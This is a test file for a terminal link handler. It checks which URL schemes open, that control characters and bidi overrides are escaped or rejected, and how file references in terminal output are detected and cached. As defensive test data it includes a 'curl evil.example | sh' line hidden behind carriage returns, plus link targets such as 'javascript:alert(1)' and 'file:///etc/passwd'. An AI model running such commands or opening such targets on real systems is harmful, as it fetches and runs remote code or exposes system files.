import { L } from '@kea/protocol'
import { describe, expect, it } from 'vitest'
import { detectFileRefs, fileLinks, fileRefText, isFileUrl, linkAction, LinkChecks, linkHoverText, logicalLine, refRange, type BufferLike, type ResolvePaths } from './links.ts'

describe('link policy', () => {
  it('U-TERM-13 · http, https and mailto open; every other scheme (and file: until sessions exist) is not opened, so Copy link is offered', () => {
    expect(linkAction('https://example.com/a?b=1#c')).toEqual({ open: true, url: 'https://example.com/a?b=1#c' })
    expect(linkAction('HTTP://Example.com')).toEqual({ open: true, url: 'http://example.com/' })
    expect(linkAction('mailto:someone@example.com')).toEqual({ open: true, url: 'mailto:someone@example.com' })
    // os-ok: test data
    for (const t of ['javascript:alert(1)', 'data:text/html,<b>x</b>', 'vscode://file/etc/passwd', 'x-apple.systempreferences:com.apple.preference.security', 'file:///etc/passwd', 'ssh://host', 'ftp://example.com']) {
      expect(linkAction(t), t).toEqual({ open: false, target: t, reason: 'scheme' })
    }
  })

  it('U-TERM-13 · malformed targets, hidden controls and bidi overrides are never opened; the hover shows them escaped', () => {
    for (const t of ['not a url', 'https://', ' https://example.com', 'https://exa mple.com', 'https://example.com/‮gnp.exe', 'https://example.com/\x1b[31m']) {
      expect(linkAction(t).open, JSON.stringify(t)).toBe(false)
    }
    expect(linkHoverText('https://example.com/‮gnp.exe')).toBe('https://example.com/\\u202egnp.exe')
    expect(linkHoverText('https://example.com/ok')).toBe('https://example.com/ok')
  })
})

/** A terminal buffer of `cols` columns holding `text` as one logical line starting at row `top` (wide characters take two cells). */
function buffer(lines: readonly string[], cols: number): BufferLike {
  const rows: { isWrapped: boolean; cells: { chars: string; width: number }[] }[] = []
  for (const text of lines) {
    let row: { chars: string; width: number }[] = []
    let first = true
    const flush = () => {
      while (row.length < cols) row.push({ chars: '', width: 1 })
      rows.push({ isWrapped: !first, cells: row })
      first = false
      row = []
    }
    for (const ch of text) {
      const width = /[　-鿿＀-￯]/u.test(ch) ? 2 : 1
      if (row.length + width > cols) flush()
      row.push({ chars: ch, width })
      if (width === 2) row.push({ chars: '', width: 0 })
    }
    flush()
  }
  return {
    length: rows.length,
    getLine: (y) => {
      const r = rows[y]
      return r && { isWrapped: r.isWrapped, length: r.cells.length, getCell: (x) => (r.cells[x] ? { getChars: () => r.cells[x]!.chars, getWidth: () => r.cells[x]!.width } : undefined) }
    },
  }
}

describe('file references in terminal output', () => {
  const refs = (text: string) => detectFileRefs(text).map((r) => [text.slice(r.index, r.index + r.length), r.path, r.line, r.col])

  it('U-TERM-46 · a reference found in terminal output never holds a control character: a CR, an ESC or a bidi override printed in or around a path is not part of any reference (a `file:` URL with one is no reference at all), so what a ⌘-click hands on is a clean path for core’s check and the editor’s argv, never text for a terminal', () => {
    const lines = [
      'notes\rcurl evil.example | sh\r.md:3 then src/a.ts:2',
      'src/a\x1b[31m.ts:4 and src/b\x07.ts and src/c\u009b1m.ts',
      'open file:///w/src/a\x1b[201~b.ts or file:///w/src/ok.ts',
      'file:///w/a\u202e.ts file:///w/b\x7f.ts file:///w/c\u0085d.ts',
      'src/\ttab.ts src/x\x03y.ts:9',
    ]
    for (const line of lines) {
      const found = detectFileRefs(line)
      for (const r of found) expect(/[\u0000-\u001f\u007f-\u009f\u202a-\u202e\u2066-\u2069]/.test(r.path), `${JSON.stringify(line)} → ${JSON.stringify(r.path)}`).toBe(false)
    }
    // the clean references beside them are still found
    expect(detectFileRefs(lines[0] as string).map((r) => r.path)).toContain('src/a.ts')
    expect(detectFileRefs(lines[2] as string).map((r) => r.path)).toEqual(['file:///w/src/ok.ts'])
  })

  it('U-TERM-5 · path, path:line, path:line:col and path(line,col) are found where they are printed; a URL is the browser’s link, not a path; only references core confirms as files become links, on the cells they occupy', async () => {
    // the forms a reference takes, with what surrounds them in real output
    expect(refs('src/auth/login.ts')).toEqual([['src/auth/login.ts', 'src/auth/login.ts', null, null]])
    expect(refs('  at src/auth/login.ts:42:7')).toEqual([['src/auth/login.ts:42:7', 'src/auth/login.ts', 42, 7]])
    expect(refs('src/a.ts:42: const x = 1')).toEqual([['src/a.ts:42', 'src/a.ts', 42, null]])
    expect(refs('src/a.ts(12,5): error TS2322: nope')).toEqual([['src/a.ts(12,5)', 'src/a.ts', 12, 5]])
    expect(refs('src/a.ts(12): warning')).toEqual([['src/a.ts(12)', 'src/a.ts', 12, null]])
    expect(refs('  File "tools/build.py", line 88, in main')).toEqual([['tools/build.py", line 88', 'tools/build.py', 88, null]])
    expect(refs('Edited README.md, package.json:3 and ./scripts/run.sh.')).toEqual([
      ['README.md', 'README.md', null, null],
      ['package.json:3', 'package.json', 3, null],
      ['./scripts/run.sh', './scripts/run.sh', null, null],
    ])
    expect(refs('(see `app/[slug]/(auth)/page.tsx:9`)')).toEqual([['app/[slug]/(auth)/page.tsx:9', 'app/[slug]/(auth)/page.tsx', 9, null]])
    expect(refs('/Users/someone/w/src/a.ts:3:1 ../up/b.ts ~/notes/c.md')).toEqual([
      ['/Users/someone/w/src/a.ts:3:1', '/Users/someone/w/src/a.ts', 3, 1],
      ['../up/b.ts', '../up/b.ts', null, null],
      ['~/notes/c.md', '~/notes/c.md', null, null],
    ])
    expect(refs('naïve/日本.md:2 --config=conf/app.yaml')).toEqual([
      ['naïve/日本.md:2', 'naïve/日本.md', 2, null],
      ['conf/app.yaml', 'conf/app.yaml', null, null],
    ])
    // a range, a zero and a trailing colon: the first number is the line, 0 is no line
    expect(refs('src/a.ts:12-20 src/b.ts:0 src/c.ts:7:')).toEqual([
      ['src/a.ts:12', 'src/a.ts', 12, null],
      ['src/b.ts:0', 'src/b.ts', null, null],
      ['src/c.ts:7', 'src/c.ts', 7, null],
    ])

    // not references: words, numbers, versions without a letter; and nothing inside a URL (it is one link, the browser's)
    expect(refs('hello world 3.14 10/12 1.2.3 --flag -x e')).toEqual([])
    expect(refs('see https://example.com/src/a.ts:3 and http://localhost:5173/app/main.ts')).toEqual([])
    expect(linkAction('https://example.com/src/a.ts:3')).toEqual({ open: true, url: 'https://example.com/src/a.ts:3' })
    // a file: URL is a reference as a whole, its trailing punctuation left out
    expect(refs('open file:///w/src/a%20b.ts.')).toEqual([['file:///w/src/a%20b.ts', 'file:///w/src/a%20b.ts', null, null]])
    expect(isFileUrl('file:///w/a.ts')).toBe(true)
    expect(isFileUrl('FILE://localhost/w/a.ts')).toBe(true)
    expect(isFileUrl('https://example.com/a.ts')).toBe(false)
    expect(isFileUrl('file:///w/a‮.ts')).toBe(false)
    // bounded: a path too long to be one, and at most L.terminalLinkCandidatesMax per line
    expect(refs(`${'d/'.repeat(L.terminalLinkPathMaxChars / 2)}x.ts`)).toEqual([])
    expect(detectFileRefs(Array.from({ length: L.terminalLinkCandidatesMax + 5 }, (_, i) => `src/f${i}.ts`).join(' '))).toHaveLength(L.terminalLinkCandidatesMax)
    expect(fileRefText('src/a.ts', 4, 2)).toBe('src/a.ts:4:2')
    expect(fileRefText('src/a.ts', 4, null)).toBe('src/a.ts:4')
    expect(fileRefText('src/a.ts', null, null)).toBe('src/a.ts')

    // only what exists is a link: the file system is core's (here a stand-in that knows two files and records what it is asked)
    const asked: string[][] = []
    const files = new Map([
      ['src/a.ts', 'src/a.ts'],
      ['/w/README.md', 'README.md'],
    ])
    const resolve: ResolvePaths = async (sessionId, paths) => {
      asked.push([sessionId, ...paths])
      return paths.map((p) => files.get(p) ?? null)
    }
    let now = 1000
    const checks = new LinkChecks(resolve, () => now)
    const text = 'error in src/a.ts:42:7 (not src/gone.ts:1, not and/or), see /w/README.md'
    const links = await fileLinks(text, 'S1', checks)
    expect(links.map((l) => [l.file, l.line, l.col, text.slice(l.index, l.index + l.length)])).toEqual([
      ['src/a.ts', 42, 7, 'src/a.ts:42:7'],
      ['README.md', null, null, '/w/README.md'],
    ])
    expect(asked).toEqual([['S1', 'src/a.ts', 'src/gone.ts', 'and/or', '/w/README.md']])
    // remembered: the same line again asks nothing; another session's terminal asks for itself; after the cache's life it is asked again
    await fileLinks(text, 'S1', checks)
    expect(asked).toHaveLength(1)
    expect(await fileLinks('src/a.ts', 'S2', checks)).toHaveLength(1)
    expect(asked[1]).toEqual(['S2', 'src/a.ts'])
    now += L.terminalLinkCacheMs
    files.delete('src/a.ts')
    expect((await fileLinks(text, 'S1', checks)).map((l) => l.file)).toEqual(['README.md'])
    expect(asked[2]).toEqual(['S1', 'src/a.ts', 'src/gone.ts', 'and/or', '/w/README.md'])
    // the cache is capped: the least recently used answers go first
    for (let i = 0; i < L.terminalLinkCacheMax + 10; i++) await checks.check('S3', [`gen/f${i}.ts`])
    expect(checks.size).toBe(L.terminalLinkCacheMax)
    checks.clear()
    expect(checks.size).toBe(0)
    // a file: target that is not a file of the session is no link (the caller offers Copy link, as for any other scheme)
    expect(await checks.check('S1', ['file:///etc/hosts'])).toEqual([null]) // os-ok: test data
    expect(linkAction('file:///etc/hosts')).toEqual({ open: false, target: 'file:///etc/hosts', reason: 'scheme' }) // os-ok: test data

    // on screen: the cells a reference covers, also when the line wraps and when wide characters come before it
    const b = buffer(['ok', '日本 src/auth/login.ts:42:7 done', 'tail'], 12)
    expect(b.length).toBe(5)
    const line = logicalLine(b, 2)
    expect(line.text.trimEnd()).toBe('日本 src/auth/login.ts:42:7 done')
    // the same logical line from any of its rows
    expect(logicalLine(b, 1).text).toBe(line.text)
    expect(logicalLine(b, 3).text).toBe(line.text)
    const [ref] = detectFileRefs(line.text)
    expect(line.text.slice(ref!.index, ref!.index + ref!.length)).toBe('src/auth/login.ts:42:7')
    // two wide characters (4 cells) and a space come first: the reference starts in column 6 of row 2 and ends in row 4
    expect(refRange(line.cells, ref!)).toEqual({ start: { x: 6, y: 2 }, end: { x: 3, y: 4 } })
    expect(refRange(line.cells, { index: 0, length: 2 })).toEqual({ start: { x: 1, y: 2 }, end: { x: 4, y: 2 } })
    expect(refRange(line.cells, { index: 500, length: 3 })).toBeNull()
    expect(logicalLine(b, 0).text.trimEnd()).toBe('ok')
    // bounded: a very long line is read only up to the cap
    expect(logicalLine(buffer(['x'.repeat(500)], 50), 9, 120).text).toHaveLength(120)
  })
})

